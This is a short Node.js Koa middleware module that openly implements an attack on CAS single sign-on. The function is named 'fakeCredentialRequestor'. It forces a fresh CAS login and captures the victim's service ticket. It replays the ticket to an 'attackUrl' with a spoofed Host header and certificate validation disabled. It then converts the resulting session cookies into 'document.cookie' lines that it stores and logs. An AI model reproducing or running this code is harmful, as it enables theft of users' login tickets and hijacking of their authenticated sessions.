const https = require('https')
const fetch = require('isomorphic-fetch')

function createCASMiddleware (options = {}) {
  const server = options.server
  const service = options.service
  const loginUrl = options.login || '/cas/login'

  function fakeCredentialRequestor ({ attackUrl }) {
    return async (ctx, next) => {
      if (!ctx.session.cookieString && !ctx.request.query.ticket) {
        const returnUrl = encodeURIComponent(service(ctx))
        ctx.redirect(
          server + loginUrl +
          '?service=' + returnUrl +
          '&renew=true')
        return
      }

      if (ctx.request.query.ticket) {
        const attack = attackUrl(ctx.request.query.ticket)
        const res = await fetch(attack, {
          headers: { 'host': ctx.request.host },
          // rejectUnauthorized is required since we're spoofing the host
          // header and ctx.request.host liekly won't be in the endpoint's HTTPS
          // certificate.
          agent: new https.Agent({ rejectUnauthorized: false })
        })

        const cookieString = res.headers._headers['set-cookie']
          .map(cookie => cookie.match(/^(.*?);/)[1])
          .map(cookie => `document.cookie = '${cookie}'`)
          .join('\n')

        ctx.session.cookieString = cookieString
        console.log(cookieString)

        ctx.status = 308
        ctx.redirect('/')
        return
      }

      await next()
    }
  }

  return { fakeCredentialRequestor }
}

module.exports = createCASMiddleware
